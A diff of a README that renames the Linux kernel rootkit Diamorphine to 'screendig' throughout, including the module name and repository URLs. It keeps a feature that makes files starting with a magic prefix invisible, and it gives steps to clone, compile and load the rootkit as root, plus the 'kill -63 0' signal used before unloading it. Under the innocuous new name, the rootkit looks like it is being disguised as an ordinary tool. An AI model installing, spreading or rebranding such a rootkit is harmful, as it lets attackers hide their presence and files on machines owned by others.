@@ -1,7 +1,7 @@
-Diamorphine
+screendig
 ===========
 
-Diamorphine is a LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x/6.x (x86/x86_64 and ARM64)
+screendig is a LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x/6.x (x86/x86_64 and ARM64)
 
 Features
 --
@@ -16,7 +16,7 @@ Features
 
 - Files or directories starting with the MAGIC_PREFIX become invisible;
 
-- Source: https://github.com/m0nad/Diamorphine
+- Source: https://github.com/m0nad/screendig
 
 Install
 --
@@ -28,12 +28,12 @@ uname -r
 
 Clone the repository
 ```
-git clone https://github.com/m0nad/Diamorphine
+git clone https://github.com/m0nad/screendig
 ```
 
 Enter the folder
 ```
-cd Diamorphine
+cd screendig
 ```
 
 Compile
@@ -43,7 +43,7 @@ make
 
 Load the module(as root)
 ```
-insmod diamorphine.ko
+insmod screendig.ko
 ```
 
 Uninstall
@@ -56,7 +56,7 @@ kill -63 0
 
 Then remove the module(as root)
 ```
-rmmod diamorphine
+rmmod screendig
 ```
 
 References
